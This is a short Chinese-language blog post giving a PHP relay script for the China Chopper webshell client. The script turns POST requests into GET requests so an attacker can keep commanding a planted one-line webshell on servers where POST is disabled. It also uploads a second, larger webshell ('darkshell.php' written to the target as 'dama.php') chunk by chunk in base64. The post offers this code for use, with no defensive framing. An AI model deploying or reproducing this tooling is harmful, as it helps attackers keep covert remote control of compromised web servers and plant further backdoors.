---
title: "PHP 菜刀中转脚本"
date: 2018-01-31T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['php']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

有的服务器 管理员脑抽把 POST 方法禁止

而菜刀是利用 POST 来发送执行代码的

只要把 POST 转换成 GET 就可以正常链接了

<!--more-->

```
<?php
ini_set('max_execution_time', '100'); // 超时时间

$url = 'http://127.0.0.1/cmd.php'; // 一句话地址
$pass = 'cmd'; // 密码
$data = $_POST['cmd']; // 中转密码

echo file_get_contents($url.'?'.$pass.'='.$data);

if(isset($_GET['upload'])){
	$f = fopen('darkshell.php','r'); // 上传文件
	while (!feof($f)){
		$content = base64_encode(fgetc($f));
		$exec = "file_put_contents('dama.php',base64_decode('$content'),FILE_APPEND);";
		file_get_contents($url.'?'.$pass.'='.$exec);
	}
	echo 'File uploaded successfully';
}
?>